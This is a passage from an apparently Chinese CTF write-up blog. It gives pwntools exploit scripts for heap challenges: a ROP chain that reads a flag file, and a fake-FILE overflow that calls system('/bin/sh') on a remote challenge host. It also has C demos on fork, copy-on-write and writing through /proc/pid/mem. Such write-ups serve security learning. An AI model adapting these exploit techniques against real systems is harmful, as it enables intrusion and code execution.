class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    payload1=p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(heap_base+<span class="number">0x16a0</span>)</span><br><span class="line">    payload1+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    payload1+=p64(pop_rax)+p64(<span class="number">0</span>)+p64(add_rsp_0x20_pop_rdx)</span><br><span class="line"></span><br><span class="line">    payload2=<span class="string">&quot;./flag\x00\x00&quot;</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x2000</span>)+p64(pop_rdx_r12)</span><br><span class="line">    payload2+=p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_ret)+p64(pop_rdi)+p64(heap_base+<span class="number">0x2000</span>)+p64(libc_base+libc.sym[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,payload2+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,payload1+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(setcontext_addr+<span class="number">61</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    delete_note(<span class="number">0</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x3-忘了叫啥名"><a href="#0x3-忘了叫啥名" class="headerlink" title="0x3 忘了叫啥名"></a>0x3 忘了叫啥名</h2><p>任意文件读加溢出io指针完成getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;10.7.2.142&quot;</span>,<span class="number">9898</span>)</span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gitf</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;FileName: &quot;</span>)</span><br><span class="line">    sh.sendline(filepath)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    guess()</span><br><span class="line">    gitf(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Open successful\n&quot;</span>)</span><br><span class="line">    elf_addr=<span class="built_in">int</span>((sh.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line">    libc_addr=<span class="built_in">int</span>((sh.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">    fake_file=elf_addr+<span class="number">0x4300</span>+<span class="number">0x10</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x4300</span>-<span class="number">0x42E0</span>)</span><br><span class="line">    pay+=p64(fake_file)+p64(<span class="number">0</span>)</span><br><span class="line">    pay+=<span class="string">&#x27;\xff\xff\xdf\xff;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=p64(fake_file+<span class="number">0xe0</span>)</span><br><span class="line">    pay+=p64(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])*<span class="number">21</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;We will give you a million bonus cheque.\nLeave your name:&quot;</span>)</span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x4-Mute-amp-Blind"><a href="#0x4-Mute-amp-Blind" class="headerlink" title="0x4 Mute&amp;Blind"></a>0x4 Mute&amp;Blind</h2><h4 id="0x4-1-父子进程的关系"><a href="#0x4-1-父子进程的关系" class="headerlink" title="0x4.1 父子进程的关系"></a>0x4.1 父子进程的关系</h4><p>涉及到了父子进程的问题，以前只是粗略的学习了一下，知道该怎么使用，这次通过这道题对父子进程有了更深刻的理解</p>
<p>每个进程都有自己的地址空间，这个地址空间是虚拟的，每个进程的虚拟地址空间都是独立的，每个进程的虚拟地址空间和这个进程真正加载到内存的物理地址存在着映射关系，当这个进程执行某一条指令时先把这个指令的虚拟地址发送到MMU(CPU的地址转换单元)，转化成这个指令的真实物理地址然后找到这个指令再进行执行。</p>
<p>当父进程创建子进程的时候，操作系统就会把父进程的虚拟地址空间复制一份再给子进程，并且父子进程的相对于物理内存的映射关系是一样的，注意是把独立的一份虚拟地址空间给了子进程，而不是父子进程共享地址空间。通过下面的代码可以证明他们的虚拟地址是一样。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,&amp;buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child is created\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,&amp;buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father:my child is pid %d\n&quot;</span>,pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;susssess\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">sprintf</span>(buff,<span class="string">&quot;/proc/%d/maps&quot;</span>,getpid());</span><br><span class="line">        <span class="keyword">int</span> fd=open(buff,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        read(fd,buf,<span class="number">900</span>);</span><br><span class="line">        write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child is created\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        read(fd,buf,<span class="number">900</span>);</span><br><span class="line">        write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father:my child is pid %d\n&quot;</span>,pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;susssess\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那映射关系一样又是什么意思呢，其实就是指他们映射到的物理内存内存是一样的，比如父进程的代码段的物理地址是1，那子进程的代码段的物理地址也是1，因为刚开始的映射关系是一样的。</p>
<p>父子进程的数据遵循写时复制，读时共享的原则，也就是读的时候他们的映射关系还是不变的，但写的时候就会发生改变，具体变化如下</p>
<p>写之前</p>
<p><img src="https://img-blog.csdn.net/20150724140942057" alt="img"></p>
<p>写完后</p>
<p><img src="https://img-blog.csdn.net/20150724141000136" alt="img"></p>
<p>但是读时共享，写时复制并不适用于代码段，首先可以确定父子进程的代码段是相同的，所以代码段是没必要复制的，因此内核将代码段标记为只读，这样父子进程就可以安全的共享此代码段了。fork之后在进程创建代码段时，新子进程的进程级页表项都指向和父进程相同的物理页帧，所以如果改变代码段的内容会破坏原先的映射关系。</p>
<p>这是我写的一个小demo。我在父进程修改了子进程的代码段，然后调试子进程，发现子进程的代码并没有被修改，可见父子进程的代码段应该也是写时复制，读时共享，所以这道题就没办法通过父进程修改子进程的代码段来控制子进程了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd,buf,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">	<span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;addr);</span><br><span class="line">	mprotect((<span class="keyword">void</span> *)addr,<span class="number">0x1000</span>,<span class="number">7</span>);</span><br><span class="line">	<span class="keyword">int</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,strerror(errno));</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">		sleep(<span class="number">10</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father and child is not shared&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">size_t</span> child_text_addr=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;input child_text_addr\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;child_text_addr);</span><br><span class="line">		<span class="built_in">sprintf</span>((<span class="keyword">void</span> *)child_text_addr,<span class="string">&quot;asdasdasdasdsad&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="0x4-2-proc-pid-self伪文件利用"><a href="#0x4-2-proc-pid-self伪文件利用" class="headerlink" title="0x4.2 /proc/pid/self伪文件利用"></a>0x4.2 /proc/pid/self伪文件利用</h4><p>这道题利用的是<code>/proc/pid/mem</code>伪文件，网上没有找见这个伪文件的具体定义，按我的理解就是这个进程的伪文件，打开的这个文件就是这个进程的虚拟地址空间的内容，可以通过这个伪文件的文件描述符对这个文件进行操作，也就是对这个进程的虚拟地址空间进行操作，比如<code>read</code>操作和<code>write</code>操作，但是注意的是read和wirte操作的虚拟地址必须是映射到内存中的，不然会发生io错误，原因也很好想，没有真实内存映射你怎么读怎么写，这是我写的一个小demo来完成当前进程的读取</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">sprintf</span>(buf,<span class="string">&quot;/proc/%d/mem&quot;</span>,getpid());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">	<span class="keyword">int</span> fd=open(buf,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,fd);</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> fd1=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buff1[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd1,buff1,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff1,<span class="number">900</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">size_t</span> offset=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;offset);</span><br><span class="line">	lseek(fd,offset,<span class="number">1</span>);</span><br><span class="line">	read(fd,buff,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff,<span class="number">900</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取代码段的效果，此程序代码段相对于程序首地址偏移0x850</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tscrf/pwn5$ ./pwnc</span><br><span class="line">/proc/5819/mem</span><br><span class="line">3</span><br><span class="line">561fcc31a000-561fcc31b000 r-xp 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcc51a000-561fcc51b000 r--p 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcc51b000-561fcc51c000 rw-p 00001000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcd474000-561fcd495000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fc4ceee2000-7fc4cf0c9000 r-xp 00000000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf0c9000-7fc4cf2c9000 ---p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2c9000-7fc4cf2cd000 r--p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2cd000-7fc4cf2cf000 rw-p 001eb000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2cf000-7fc4cf2d3000 rw-p 00000000 00:</span><br><span class="line">94694569781328</span><br><span class="line">]��f.�]�@f.�H�=I H�5B UH)�H��H��H��H��?H�H��tH� H��t</span><br><span class="line">                                                           ]��f�]�@f.��=� u/H�=� UH��t</span><br><span class="line">����H����� ]����fDUH��]�f���UH��H��dH�%(H�E�1�H��������</span><br><span class="line">                                                            H���H�H���H���&#x27;�����H������H�5�H�Ǹ�z���H������H�������H�������H�Ǹ�2�����������������H�=�������H�� �����&#125;H���H��H�=�������������H�������&#125;H���H�H�������������H�Ή������H�������H�ƿ�4����</span><br><span class="line">�</span><br><span class="line">���Hǅ����H������H��H�=#��t���H������H���������H�Ή��%���H�� �����������H�Ή�����H�� �����H�ƿ������H�u�dH34%(t�������DAWAVI��AUATL�%6 UH�-6 SA��I��L)�H�H������H��t 1��L��L��D��A��H��H9�u�H�[]A\A]A^A_Ðf.���H�H��/proc/%d/mem%d</span><br><span class="line"><span class="meta">/proc/self/maps%</span><span class="bash">lld;8rootzhang@ubuntu:~/get-shell/tscrf/pwn5$</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>程序修改代码段导致程序异常</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> s=<span class="number">4</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	s=<span class="number">5</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(buf,<span class="string">&quot;/proc/%d/mem&quot;</span>,getpid());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">	<span class="keyword">int</span> fd=open(buf,O_RDWR);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,fd);</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> fd1=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buff1[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd1,buff1,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff1,<span class="number">900</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">size_t</span> offset=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;offset);</span><br><span class="line">	lseek(fd,offset,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">		buff[i]=<span class="number">0xcc</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ret=write(fd,buff,<span class="number">0x1</span>);</span><br><span class="line">	<span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,strerror(errno));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hock is not 